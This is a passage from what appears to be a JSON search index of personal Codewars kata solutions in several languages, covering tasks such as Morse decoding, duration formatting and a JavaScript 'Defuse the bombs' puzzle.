JavaScript\n\n```js\nfunction validatePIN (pin) {\n  const pinRegex = new RegExp(\"^\\\\d{4}(?:\\\\d{2})?$\");\n  return pinRegex.test(pin);\n}\n```\n","n":0.289}}},{"i":136,"$":{"0":{"v":"What is between?","n":0.577},"1":{"v":"\n### Elixir\n\n```elixir\ndefmodule Kata do\n  def between(a,b) do\n    Enum.to_list(a..b)\n  end\nend\n```\n","n":0.333}}},{"i":137,"$":{"0":{"v":"Best travel","n":0.707},"1":{"v":"\n### JavaScript\n\n```js\nfunction chooseBestSum(maxTotal, numTowns, distances) {\n  // https://stackoverflow.com/a/42531964/6456163\n  let combinations = new Array(1 << distances.length).fill().map(\n    (e1,i) => distances.filter((e2, j) => i & 1 << j));\n  let routes = combinations.filter(a => a.length == numTowns);\n  let maxSum = 0;\n\n  for (let i = 0; i < routes.length; i++) {\n    let sum = routes[i].reduce((acc, val) => acc + val);\n    if (sum > maxSum && sum <= maxTotal) maxSum = sum;\n  }\n\n  return maxSum != 0 ? maxSum : null;\n}\n```\n","n":0.115}}},{"i":138,"$":{"0":{"v":"Persistent Bugger.","n":0.707},"1":{"v":"\n### JavaScript\n\n```js\nfunction persistence(num) {\n  var sNumber = num.toString(), result = 1, numTimes = 0;\n  for (let i = 0; i < sNumber.length; i++) {\n    if (sNumber.length > 1) numTimes++;\n\n    for (let j = 0; j < sNumber.length; j++) {\n      result *= parseInt(sNumber.charAt(j));\n    }\n\n    sNumber = result.toString(), i = 0, result = 1;\n  }\n\n  return numTimes;\n}\n```\n","n":0.135}}},{"i":139,"$":{"0":{"v":"Exes and Ohs","n":0.577},"1":{"v":"\n### JavaScript\n\n```js\nfunction XO(str) {\n  let numX = 0, numO = 0;\n  str = str.toLowerCase();\n  for (let i = 0; i < str.length; i++) {\n    if (str[i] == 'x') {\n      numX++;\n    } else if (str[i] == 'o') {\n      numO++;\n    }\n  }\n\n  return numX == numO;\n}\n```\n","n":0.151}}},{"i":140,"$":{"0":{"v":"IQ Test","n":0.707},"1":{"v":"\n### JavaScript\n\n```js\nfunction iqTest(numbers) {\n  let evens = [], odds = [];\n  numbers = numbers.split(' ').map(x => +x);\n  numbers.forEach((num) => {\n    num % 2 == 0 ? evens.push(num) : odds.push(num);\n  });\n\n  return numbers.indexOf(odds.length == 1 ? odds[0] : evens[0]) + 1;\n}\n```\n","n":0.158}}},{"i":141,"$":{"0":{"v":"Jenny's secret message","n":0.577},"1":{"v":"\n### Elixir\n\n```elixir\ndefmodule Kata do\n  def greet(\"Johnny\"), do: \"Hello, my love!\"\n  def greet(name), do: \"Hello, #{name}!\"\nend\n```\n","n":0.258}}},{"i":142,"$":{"0":{"v":"Deodorant Evaporator","n":0.707},"1":{"v":"\n### Elixir\n\n```elixir\ndefmodule Evaporator do\n\n  @spec evaporator(number, number, number) :: number\n\n  def evaporator(content, evap_per_day, threshold) do\n    count = 0\n    percent_remaining = 1 - (evap_per_day / 100)\n    percent_thresh = evap_per_day * (threshold / 100)\n\n    length(\n      Stream.unfold({evap_per_day, count}, fn { x, count}  ->\n        IO.puts x\n        if x > percent_thresh do\n          {x, {x * percent_remaining, count + 1} }\n        else\n          nil\n        end\n      end) |> Enum.to_list()\n    )\n  end\n\nend\n```\n","n":0.126}}},{"i":143,"$":{"0":{"v":"Defuse the bombs!","n":0.577},"1":{"v":"\n### JavaScript\n\n```js\n// Bomb #1 - the object property gives the answer\n//console.log( Bomb );\nBomb.diffuse( 42 );\n\n// Bomb #2 - needs to be called five times\nfor (let i = 0; i < 5; i++) Bomb.diffuse( i );\n\n// Bomb #3 - use the answer from Node's global vars\n//console.log(global);\nBomb.diffuse( global.BombKey );\n\n// Bomb #4 - created the function that's called, which didn't exist before\n//console.log(Bomb.diffuse.toString())\ndiffuseTheBomb = () => true;\nBomb.diffuse();\n\n// Bomb #5 - decoded the base64 hint\nBomb.diffuse(\"3.14159\");\n\n// Bomb #6 - date exactly four years ago\nBomb.diffuse(new Date().setYear(2016));\n\n// Bomb #7 - don't let the function modify the value of the key property\nBomb.diffuse(Object.freeze({ key: 43 }));\n\n// Bomb #8 - make the implicit valueOf function explicit, to control the behavior\nconst hack = {\n  valueOf: () => {\n    if (!this.called) {\n      this.called = true;\n      return 0;\n    } else { return 20 }\n  }\n}\nBomb.diffuse(hack);\n\n// Bomb #9 - overwrite Math.random() valueOf prototype\nMath.random = function() {\n  return {\n    valueOf: () => {\n      if (!this.called) {\n        this.called = true;\n        return 0.5;\n      } else { return 1 }\n    }\n  }\n}\nBomb.diffuse(42);\n\n// Bomb #10 - overwrite valueOf for arrays, to get the sum tested (42)\nArray.prototype.valueOf = function() {\n  return this.reduce((acc, val) => acc + val);\n}\nBomb.diffuse(new Buffer(\"yes\").toString(\"base64\"));\n```\n\n```js\n","n":0.073}}},{"i":144,"$":{"0":{"v":"You're a square!","n":0.577},"1":{"v":"\n### JavaScript\n\n```js\nvar isSquare = function(n) {\n  const sign = Math.sign(n);\n  return sign != -1 && Math.sqrt(n) % 1 === 0;\n}\n```\n","n":0.224}}},{"i":145,"$":{"0":{"v":"Counting Duplicates","n":0.707},"1":{"v":"\n### Python\n\n```py\nfrom collections import Counter\n\ndef duplicate_count(text):\n    if not text: return 0\n    frequencies = Counter(text.lower())\n    return len(list(\n        filter(lambda x: x > 1, frequencies.values())\n    ))\n```\n","n":0.209}}},{"i":146,"$":{"0":{"v":"Isograms","n":1},"1":{"v":"\n### JavaScript\n\n```js\nfunction isIsogram(str) {\n  let existingChars = \"\";\n  str = str.toLowerCase();\n\n  const chars = str.split(\"\");\n  for (let i = 0; i < chars.length; i++) {\n    const currentChar = chars[i];\n    if (existingChars.includes(currentChar)) {\n      return false;\n    } else {\n      existingChars += currentChar;\n    }\n  }\n\n  return true;\n}\n```\n","n":0.151}}},{"i":147,"$":{"0":{"v":"Decode the Morse code, advanced","n":0.447},"1":{"v":"\n### JavaScript\n\n```js\nconst decodeBits = (bits) => {\n  // Removes any leading zeros\n  bits = bits.substring(bits.indexOf(\"1\"));\n\n  // Removes any trailing zeros (after last occurance of '1')\n  bits = bits.substring(0, bits.lastIndexOf(\"1\") + 1);\n\n  // To detect the transmission rate\n  let count = 1,\n    minCount = 1,\n    maxCount = 1,\n    previousChar = '',\n    firstRun = true;\n\n  for (let i = 0; i < bits.length; i++) {\n    const currentChar = bits[i];\n    if (currentChar == previousChar) {\n      count++;\n    } else {\n      if (count > maxCount) {\n        if (firstRun) {\n          minCount = count;\n          firstRun = false;\n        }\n\n        maxCount = count;\n      }\n\n      if (count < minCount)\n        minCount = count;\n\n      count = 1;\n    }\n\n    previousChar = currentChar;\n  }\n\n  // Fix last char issues with the loop\n  if (count == 1) minCount = 1;\n\n  let doubleBits = \"\";\n  for (let i = 0; i < bits.length; i += minCount)\n    doubleBits += bits[i];\n\n  if (allCharactersSame(bits))\n    doubleBits = doubleBits.charAt(0);\n\n  const decodedBits = doubleBits\n    .replace(/111/g, '-')\n    .replace(/1/g, '.')\n    .replace(/0000000/g, '   ')\n    .replace(/000/g, ' ')\n    .replace(/0/g, '');\n\n  return decodedBits;\n}\n\nfunction allCharactersSame(str) {\n  for (let i = 1; i < str.length; i++)\n    if (str.charAt(i) != str.charAt(0))\n      return false;\n\n  return true;\n}\n\nconst decodeMorse = (morseCode) => {\n  let decodedString = \"\";\n  const morseChars = morseCode.replace(/  /g, ' ').split(' ');\n\n  for (let i = 0; i < morseChars.length; i++) {\n    var currentChar = MORSE_CODE[morseChars[i]];\n    if (!currentChar) currentChar = \" \";\n\n    decodedString += currentChar;\n  }\n\n  return decodedString;\n}\n```\n","n":0.066}}},{"i":148,"$":{"0":{"v":"Decode the Morse code","n":0.5},"1":{"v":"\n### JavaScript\n\n```js\ndecodeMorse = function(morseCode) {\n  var decodedMessage = \"\";\n  var chars = morseCode.trim().replace(/  /g, ' ').split(' ');\n\n  for (let i = 0; i < chars.length; i++) {\n    let currentChar = MORSE_CODE[chars[i]];\n    if (!currentChar) currentChar = \" \";\n\n    decodedMessage += currentChar;\n  }\n\n  return decodedMessage;\n}\n```\n","n":0.152}}},{"i":149,"$":{"0":{"v":"Replace With Alphabet Position","n":0.5},"1":{"v":"\n### JavaScript\n\n```js\nfunction alphabetPosition(text) {\n  var words = text.toLowerCase().split(' ');\n  var initialCharCode = 96;\n\n  var positionString = \"\";\n  words.forEach(word => {\n    var chars = word.split('');\n    chars.forEach(char => {\n      var charCode = char.charCodeAt(0) - initialCharCode;\n      if (charCode <= 26 && charCode >= 1) {\n        positionString += charCode + \" \";\n      }\n    });\n  });\n\n  return positionString.trim();\n}\n```\n\n### PHP\n\n```php\nfunction alphabet_position(string $s): string {\n  $upper = strtoupper($s);\n  $chars = preg_replace( '/[\\W]/', '', $upper);\n  $charArray = str_split($chars);\n  $alphabetPositions = \"\";\n\n  for ($i = 0; $i < count($charArray); $i++) {\n    if (ord($charArray[$i]) - 64 >= 1)\n    $alphabetPositions .= (ord($charArray[$i]) - 64) . \" \";\n  }\n\n  return trim($alphabetPositions);\n}\n```\n","n":0.101}}},{"i":150,"$":{"0":{"v":"Convert a String to a Number!","n":0.408},"1":{"v":"\n### JavaScript\n\n```js\nconst stringToNumber = function(str) {\n  return parseInt(str);\n}\n```\n","n":0.354}}},{"i":151,"$":{"0":{"v":"A Chain adding function","n":0.5},"1":{"v":"\n### JavaScript\n\n```js\nfunction add() {\n  var args = [...arguments];\n  function addReturn() {\n    // Recursion passing back previous total and remaining args\n    return add(...args, ...arguments);\n  }\n\n  addReturn.value = args.reduce((total, val) => total + val);\n  addReturn.valueOf = () => { return addReturn.value };\n  return addReturn;\n}\n```\n","n":0.154}}},{"i":152,"$":{"0":{"v":"Jaden Casing Strings","n":0.577},"1":{"v":"\n### JavaScript\n\n```js\nString.prototype.toJadenCase = function () {\n  var words = this.split(' ');\n  words.forEach(function(word, index) {\n    words[index] = word.charAt(0).toUpperCase() + word.slice(1);\n  });\n\n  return words.join(' ');\n};\n```\n","n":0.209}}},{"i":153,"$":{"0":{"v":"Sum Strings as Numbers","n":0.5},"1":{"v":"\n### JavaScript\n\n```js\nfunction sumStrings(x, y) {\n  let sum = \"\";\n  let len;\n  const lenx = x.length;\n  const leny = y.length;\n  let x1, y1, rem, div = 0;\n\n  if (lenx > leny) len = lenx;\n  else len = leny;\n\n  for (var i = 0; i < len; i++) {\n    if (i >= lenx) x1  = 0;\n    else x1 = parseInt(x[lenx - i - 1]);\n    if (i >= leny) y1 = 0;\n    else y1 = parseInt(y[leny - i - 1]);\n    rem = (x1 + y1 + div) % 10;\n    div = Math.floor((x1 + y1 + div) / 10);\n    sum = rem + sum;\n  }\n\n  if (div > 0) sum = div + sum;\n  if (sum.charAt(0) == 0) sum = sum.substring(1);\n\n  return sum;\n}\n```\n\n### PHP\n\n```php\nfunction sum_strings($a, $b) {\n  return (float)$a + (float)$b;\n}\n```\n","n":0.089}}},{"i":154,"$":{"0":{"v":"Disemvowel Trolls","n":0.707},"1":{"v":"\n### JavaScript\n\n```js\nfunction disemvowel(str) {\n  const regex = /[aeiou]/gi;\n  str = str.replace(regex, '');\n\n  return str;\n}\n```\n","n":0.267}}},{"i":155,"$":{"0":{"v":"Does my number look big in this?","n":0.378},"1":{"v":"\n### JavaScript\n\n```js\nfunction narcissistic(value) {\n  let digits = value.toString().split('').map(x => parseInt(x));\n  let len = digits.length, sum = 0;\n  digits.forEach((num) => sum += Math.pow(num, len));\n\n  return sum == value;\n}\n```\n\n### CoffeeScript\n\n```coffee\nnarcissistic = (value) ->\n  digits = value.toString().split('').map (x) -> parseInt(x)\n  len = digits.length; sum = 0;\n  digits.forEach((num) => sum += Math.pow(num, len));\n\n  return sum == value;\n```\n","n":0.137}}},{"i":156,"$":{"0":{"v":"Number Zoo Patrol","n":0.577},"1":{"v":"\n### PHP\n\n```php\nfunction find_number(array $a): int {\n  sort($a);\n  $len = count($a);\n\n  for ($i = 1; $i <= $len; $i++) {\n    if ($i - 1 != $a[$i - 1] - 1) {\n      return $i;\n    }\n  }\n\n  return $len + 1;\n}\n```\n\n### JavaScript\n\n```js\nfunction findNumber(array) {\n  if (array.length == 0) return 1;\n  let arraySum = array.reduce((sum, val) => sum + val);\n  return ((array.length + 1) * (array.length + 2) / 2) - arraySum;\n}\n```\n\n### CoffeeScript\n\n```coffee\nfindNumber = (array) ->\n  if array.length == 0\n    return 1;\n  arraySum = array.reduce((sum, val) => sum + val);\n  return ((array.length + 1) * (array.length + 2) / 2) - arraySum;\n```\n","n":0.101}}},{"i":157,"$":{"0":{"v":"Human readable duration format","n":0.5},"1":{"v":"\n### JavaScript\n\n```js\nfunction formatDuration (seconds) {\n  if (seconds == 0) return 'now';\n  let years = 0, days = 0, hours = 0, minutes = 0;\n\n  if (seconds >= 31536000) {\n    years = parseInt(seconds / 31536000);\n    seconds = seconds % 31536000;\n  }\n  if (seconds >= 86400) {\n    days = parseInt(seconds / 86400);\n    seconds = seconds % 86400;\n  }\n  if (seconds >= 3600) {\n    hours = parseInt(seconds / 3600);\n    seconds = seconds % 3600;\n  }\n  if (seconds >= 60) {\n    minutes = parseInt(seconds / 60);\n    seconds = seconds % 60;\n  }\n\n  let numMetrics = [years, days, hours, minutes, seconds]\n    .reduce(function(acc, val) { return acc + (val != 0 ? 1 : 0); }, 0);\n\n  let result = \"\";\n  if (years != 0) {\n    result += years + \" year\" + (years > 1 ? 's' : '');\n    if (numMetrics == 2) result += \" and \";\n    if (numMetrics > 2) result += \", \";\n    numMetrics--;\n  }\n  if (days != 0) {\n    result += days + \" day\" + (days > 1 ? 's' : '');\n    if (numMetrics == 2) result += \" and \";\n    if (numMetrics > 2) result += \", \";\n    numMetrics--;\n  }\n  if (hours != 0) {\n    result += hours + \" hour\" + (hours > 1 ? 's' : '');\n    if (numMetrics == 2) result += \" and \";\n    if (numMetrics > 2) result += \", \";\n    numMetrics--;\n  }\n  if (minutes != 0) {\n    result += minutes + \" minute\" + (minutes > 1 ? 's' : '');\n    if (numMetrics == 2) result += \" and \";\n    if (numMetrics > 2) result += \", \";\n    numMetrics--;\n  }\n  if (seconds != 0) {\n    result += seconds + \" second\" + (seconds > 1 ? 's' : '');\n  }\n\n  return result.trim();\n}\n```\n\n### CoffeeScript\n\n```coffee\nformatDuration = (seconds) ->\n  if seconds == 0\n    return 'now';\n  [years, days, hours, minutes] = [0,0,0,0]\n\n  if seconds >= 31536000\n    years = parseInt(seconds / 31536000);\n    seconds = seconds % 31536000;\n  if seconds >= 86400\n    days = parseInt(seconds / 86400);\n    seconds = seconds % 86400;\n  if seconds >= 3600\n    hours = parseInt(seconds / 3600);\n    seconds = seconds % 3600;\n  if seconds >= 60\n    minutes = parseInt(seconds / 60);\n    seconds = seconds % 60;\n\n  `numMetrics = [years, days, hours, minutes, seconds]\n    .reduce(function(acc, val) { return acc + (val != 0 ? 1 : 0); }, 0);`\n\n  result = \"\";\n  if years != 0\n    result += years + \" year\" + `(years > 1 ? 's' : '')`;\n    if numMetrics == 2\n      result += \" and \";\n    if numMetrics > 2\n      result += \", \";\n    numMetrics--;\n  if days != 0\n    result += days + \" day\" + `(days > 1 ? 's' : '')`;\n    if numMetrics == 2\n      result += \" and \";\n    if numMetrics > 2\n      result += \", \";\n    numMetrics--;\n  if hours != 0\n    result += hours + \" hour\" + `(hours > 1 ? 's' : '')`;\n    if numMetrics == 2\n      result += \" and \";\n    if numMetrics > 2\n      result += \", \";\n    numMetrics--;\n  if minutes != 0\n    result += minutes + \" minute\" + `(minutes > 1 ? 's' : '')`;\n    if numMetrics == 2\n      result += \" and \";\n    if numMetrics > 2\n      result += \", \";\n    numMetrics--;\n  if seconds != 0\n    result += seconds + \" second\" + `(seconds > 1 ? 's' : '')`;\n\n  return result.trim();\n```\n","n":0.043}}},{"i":158,"$":{"0":{"v":"Human Readable Time","n":0.577},"1":{"v":"\n### Elixir\n\n```elixir\ndefmodule HumanReadable do\n  def format(seconds) do\n    sec = \"#{ rem seconds, 60 }\"\n    min = \"#{ rem trunc(seconds / 60), 60 }\"\n    hour = \"#{ trunc(seconds / 60 / 60) }\"\n    Enum.map_join [hour, min, sec], \":\", &(String.pad_leading(&1, 2, \"0\"))\n  end\nend\n```\n\n### JavaScript\n\n```js\nfunction humanReadable(seconds) {\n  sec = seconds % 60\n  min = Math.trunc(seconds / 60) % 60\n  hour = Math.trunc(seconds / 60 / 60)\n  return [hour, min, sec].map(x => `${x}`.padStart(2, \"0\")).join(\":\")\n}\n```\n","n":0.12}}},{"i":159,"$":{"0":{"v":"Who likes it?","n":0.577},"1":{"v":"\n### JavaScript\n\n```js\nfunction likes(names) {\n  if (names === undefined || names.length == 0) {\n    return \"no one likes this\";\n  } else if (names.length == 1) {\n    return names[0] + \" likes this\";\n  } else if (names.length == 2) {\n    return names[0] + \" and \" + names[1] + \" like this\";\n  } else if (names.length == 3) {\n    return names[0] + \", \" + names[1] + \" and \" + names[2] + \" like this\";\n  } else {\n    const numNamesRemaining = names.length - 2;\n    return names[0] + \", \" + names[1] + \" and \" + numNamesRemaining + \" others like this\";\n  }\n}\n```\n","n":0.099}}},{"i":160,"$":{"0":{"v":"Stop gninnipS My sdroW!","n":0.5},"1":{"v":"\n### JavaScript\n\n```js\nfunction spinWords(sentence) {\n  return sentence.split(' ').map(word => word.length > 4 ? word.split('').reverse().join('') : word).join(' ');\n}\n```\n\n### CoffeeScript\n\n```coffee\nspinWords = (string) ->\n  return `string.split(' ').map(word => word.length > 4 ? word.split('').reverse().join('') : word).join(' ')`\n```\n\n### Python\n\n```py\ndef spin_words(sentence):\n    sentence = sentence.split(' ')\n    for i in range(len(sentence)):\n        sentence[i] = reverse(sentence[i])\n    return ' '.join(sentence)\n\ndef reverse(word):\n    if len(word) > 4:\n        return word[::-1]\n    return word\n```\n\n### TypeScript\n\n```ts\nexport class Kata {\n  static spinWords(words: string) {\n    return words.split(' ').map(word => word.length > 4 ? word.split('').reverse().join('') : word).join(' ');\n  }\n}\n```\n","n":0.113}}},{"i":161,"$":{"0":{"v":"Create Phone Number","n":0.577},"1":{"v":"\n### JavaScript\n\n```js\nfunction createPhoneNumber(numbers) {\n  return `(${numbers.getRangeAsString(0,2)}) ${numbers.getRangeAsString(3,5)}-${numbers.getRangeAsString(6,9)}`;\n}\n\nArray.prototype.getRangeAsString = function(start, stop) {\n  var target = this, string = \"\";\n  for (let index = start; index <= stop; index++) {\n    string += target[index];\n  }\n\n  return string;\n};\n```\n\n### PHP\n\n```php\nfunction createPhoneNumber($numbersArray) {\n  $numbers = implode(\"\", $numbersArray);\n  return \"(\" . substr($numbers,0,3) . \") \" . substr($numbers,3,3) . \"-\" . substr($numbers,6,4);\n}\n```\n","n":0.136}}},{"i":162,"$":{"0":{"v":"Moving Zeros To The End","n":0.447},"1":{"v":"\n### JavaScript\n\n```js\nvar moveZeros = function (arr) {\n  // To retest same index in case the new value is also a 0\n  // Didn't want to think of a fancy way to retest indexes the first go-around\n  for (let lazy = 0; lazy < 10; lazy++) {\n    for (let i = 0; i < arr.length; i++) {\n      if (arr[i] === 0) {\n        arr.splice(i, 1);\n        arr.push(0);\n      }\n    }\n  }\n\n  return arr;\n}\n```\n","n":0.12}}},{"i":163,"$":{"0":{"v":"Adjacent repeated words in a string","n":0.408},"1":{"v":"\n### JavaScript\n\n```js\nfunction countAdjacentPairs(searchString) {\n  let words = searchString.split(' ').map(word => word.toLowerCase());\n  let count = 0, lastMatch = '';\n  while (words.length > 1) {\n    var bool = false;\n    if (words[0].localeCompare(words[1]) == 0 && words[0].localeCompare(lastMatch) != 0) {\n      lastMatch = words[0];\n      bool = true;\n\n      count++;\n      words.shift();\n    }\n\n    if (!bool) lastMatch = words[0];\n    words.shift();\n  }\n\n  return count;\n}\n```\n","n":0.136}}},{"i":164,"$":{"0":{"v":"The Hashtag Generator","n":0.577},"1":{"v":"\n### Python\n\n```py\ndef generate_hashtag(s):\n    capital_sentence = \"\".join(w.capitalize() for w in s.split())\n    length = len(capital_sentence)\n    if length == 0 or length > 140:\n        return False\n\n    return \"#\" + capital_sentence\n```\n","n":0.192}}},{"i":165,"$":{"0":{"v":"Array.diff","n":1},"1":{"v":"\n### Elixir\n\n```elixir\ndefmodule ArrayDiff do\n  def array_diff(a, b) do\n    Enum.filter(a, fn(val) -> !Enum.member?(b, val) end)\n  end\nend\n```\n","n":0.258}}},{"i":166,"$":{"0":{"v":"Function 1 - hello world","n":0.447},"1":{"v":"\n### PowerShell\n\n```powershell\n# Write a function `greet` that returns \"hello world!\"\nfunction greet { return \"Hello World!\" }\n```\n","n":0.25}}},{"i":167,"$":{"0":{"v":"Codewars style ranking system","n":0.5},"1":{"v":"\n### JavaScript\n\n```js\nclass User {\n  constructor() {\n    this.rank = -8;\n    this.progress = 0;\n  }\n  rank() {\n    return this.rank;\n  }\n  progress() {\n    return this.progress;\n  }\n  incProgress(rank) {\n    // Make sure rank passed is valid\n    if (rank > 8 || rank < -8 || rank == 0) {\n      throw \"Outside range\";\n      return null;\n    }\n\n    // Skip over 0 in difference calculations\n    let diff = Math.abs(this.rank - rank);\n    if (this.rank < 0 && rank > 0) diff -= 1;\n\n    if (this.rank == 8) {\n      // No progression once rank 8\n      this.progress = 0;\n    } else {\n      if (this.rank == rank + 1) {\n        // Activity rank is one less than user\n        this.progress += 1;\n      } else if (this.rank == rank) {\n        // Same rank\n        this.progress += 3;\n      } else if (rank > this.rank) {\n        this.progress += 10 * diff * diff;\n      } else {\n        // Because kata description does not match tests\n        this.progress += 1;\n      }\n\n      this.incRank();\n    }\n  }\n  incRank() {\n    if (this.progress > 100 && this.rank != 8) {\n      // Loop over progress and update rank for every 100 points\n      for (let i = this.progress; i > 99; i -= 100) {\n        this.rank += (this.rank == -1) ? 2 : 1;\n        this.progress -= 100;\n\n        // Reset progress if new rank is 8\n        if (this.rank == 8) this.progress = 0;\n      }\n    }\n  }\n}\n```\n\n### CoffeeScript\n\n```coffee\nclass User\n  constructor: ->\n    this.rank = -8;\n    this.progress = 0;\n  rank: ->\n    return this.rank;\n  progress: ->\n    return this.progress;\n  incProgress: (rank) ->\n    # Make sure rank passed is valid\n    if rank > 8 || rank < -8 || rank == 0\n      throw \"Outside range\";\n      return null;\n\n    # Skip over 0 in difference calculations\n    diff = Math.abs(this.rank - rank);\n    if this.rank < 0 && rank > 0\n      diff -= 1;\n\n    if this.rank == 8\n      # No progression once rank 8\n      this.progress = 0;\n    else\n      if this.rank == rank + 1\n        # Activity rank is one less than user\n        this.progress += 1;\n      else if this.rank == rank\n        # Same rank\n        this.progress += 3;\n      else if rank > this.rank\n        this.progress += 10 * diff * diff;\n      else\n        # Because kata description does not match tests\n        this.progress += 1;\n\n      this.incRank();\n  incRank: ->\n    if this.progress > 100 && this.rank != 8\n      # Loop over progress and update rank for every 100 points\n      while this.progress > 99\n        this.rank += `(this.rank == -1) ? 2 : 1`;\n        this.progress -= 100;\n\n        # Reset progress if new rank is 8\n        if this.rank == 8\n          this.progress = 0;\n```\n","n":0.05}}},{"i":168,"$":{"0":{"v":"String ends with?","n":0.577},"1":{"v":"\n### Elixir\n\n```elixir\ndefmodule EndsWith do\n  def solution(str, ending) when ending == \"\", do: true\n\n  def solution(str, ending) do\n    string_len = String.length(str)\n    search_len = String.length(ending)\n    ending == String.slice(str, -search_len, string_len)\n  end\n\nend\n```\n","n":0.186}}},{"i":169,"$":{"0":{"v":"Convert string to camel case","n":0.447},"1":{"v":"\n### JavaScript\n\n```js\nfunction toCamelCase(str) {\n  var firstWordCapital = str.charAt(0) == str.charAt(0).toUpperCase();\n  var camelCase = \"\";\n\n  str.split(/[- _]+/).forEach((word, wordIndex) => {\n    word.split('').forEach((char, charIndex) => {\n      if (wordIndex == 0 && charIndex == 0) {\n        camelCase += firstWordCapital ? char.toUpperCase() : char.toLowerCase();\n      } else {\n        camelCase += charIndex == 0 ? char.toUpperCase() : char.toLowerCase();\n      }\n    });\n  });\n\n  return camelCase;\n}\n```\n","n":0.134}}},{"i":170,"$":{"0":{"v":"Reversed Strings","n":0.707},"1":{"v":"\n### JavaScript\n\n```js\nfunction solution(str) {\n  return str.split('').reverse().join('');\n}\n```\n","n":0.408}}},{"i":171,"$":{"0":{"v":"Largest 5 digit number in a series","n":0.378},"1":{"v":"\n### JavaScript\n\n```js\nfunction solution(digits) {\n  var greatestNum = 0, sequenceLength = 5;\n  for (var i = 0; i < digits.length - (sequenceLength - 1); i++) {\n    var num = \"\";\n    for (var j = 0; j < sequenceLength; j++) {\n      num += digits[i + j];\n    }\n\n    num = parseInt(num);\n    if (num > greatestNum) greatestNum = num;\n  }\n\n  return greatestNum;\n}\n```\n","n":0.131}}},{"i":172,"$":{"0":{"v":"Split Strings","n":0.707},"1":{"v":"\n### Python\n\n```py\ndef solution(s):\n    solution_array = []\n    for i in range(0, len(s), 2):\n        string = s[i] + (s[i+1] if i+1 < len(s) else '_')\n        solution_array.append(string)\n    return solution_array\n```\n","n":0.196}}},{"i":173,"$":{"0":{"v":"RGB To Hex Conversion","n":0.5},"1":{"v":"\n### Elixir\n\n```elixir\ndefmodule Kata do\n  def rgb(r,g,b) do\n    Enum.map_join([r, g, b], fn x ->\n      convert_to_hex(\n        make_valid_value(x)\n      )\n    end)\n  end\n\n  def make_valid_value(num) do\n    cond do\n      num > 255 -> 255\n      num < 0 -> 0\n      true -> num\n    end\n  end\n\n  def convert_to_hex(num) do\n    hex = Integer.to_string(num, 16)\n    if String.length(hex) == 1, do: \"0\" <> hex, else: hex\n  end\nend\n```\n","n":0.134}}},{"i":174,"$":{"0":{"v":"Multiply","n":1},"1":{"v":"\n### JavaScript\n\n```js\nfunction multiply(a, b) {\n  return a * b;\n}\n```\n","n":0.333}}},{"i":175,"$":{"0":{"v":"Codepen","n":1}}}]}
